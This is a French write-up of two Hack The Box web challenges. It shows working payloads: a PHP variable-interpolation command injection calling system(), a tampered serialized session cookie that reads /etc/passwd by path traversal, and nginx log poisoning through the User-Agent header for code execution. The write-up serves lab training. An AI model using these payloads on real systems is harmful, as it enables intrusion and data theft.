# Challenges Web HTB

## LoveTok

La page principale est une URL terminant par "/?format=r" et il semble possible de faire varier ce format, notamment en y mettant des données non-prévues. Cela semble être un point d'entrée pour une injection.

Impossible d'utiliser les caractères suivants à cause de la fonction addslashes() utilisée sur le format dans le code source : 
- '
- "
- \

Impossible d'utiliser de l'encodage puisque la variable $_GET[] va décoder le payload avant de le passer à TimeModel() : 

    $format = isset($_GET['format'])? $_GET['format'] : 'r';
    $time = new TimeModel($format);


Il reste donc l'option des variables complexes : 

    ${system($_GET[commande])}&commande=ls+/
    ${system($_GET[commande])}&commande=cat+/flag

## Toxic 

Dans la page **index.php** on observe que le cookie de session est généré à partir d'un nom de fichier. Ce nom de fichier est sérialisé et combiné avec un calcul : 

    if (empty($_COOKIE['PHPSESSID']))
    {
        $page = new PageModel;
        $page->file = '/www/index.html';

        setcookie(
            'PHPSESSID', 
            base64_encode(serialize($page)), 
            time()+60*60*24, 
            '/'
        );
    } 

En faisant une requête classique on peut récupérer un cookie au format traditionnel : 

>Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9

Le décodage en Base64 de cette valeur donne le résultat suivant : 

    O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

En remplaçant "**/www/index.html**" par "**/etc/passwd**" puis en réencodant en Base64 on obtient bien le contenu de ce fichier. **Attention à bien mettre à jour le champ "s" qui précède le chemin avec la bonne longueur !**

Exemple de payload en clair : 

    O:9:"PageModel":1:{s:4:"file";s:34:"../../../../../../../../etc/passwd";}

Il faudrait adapter ce payload pour lire le flag directement, mais le nom du flag est généré dynamiquement et n'est pas devinable. On doit donc trouver une RCE.

Le titre du challenge fait directement penser au Log Poisoning et le cas de figure LFI => Log Poisoning => RCE est très connu. Je suis donc parti sur cette voie : 

    O:9:"PageModel":1:{s:4:"file";s:48:"../../../../../../../../var/log/nginx/access.log";}
    
Ce payload encodé en Base64 fonctionne et nous sort les logs du serveur. L'user-agent est bien reflété dedans, on peut donc refaire des requêtes classiques mais cette fois avec les valeurs suivantes dans le header "User-Agent" : 

    <?php system('id'); ?>
    <?php system('ls /'); ?>
    <?php system('cat /flag_K61S1'); ?>

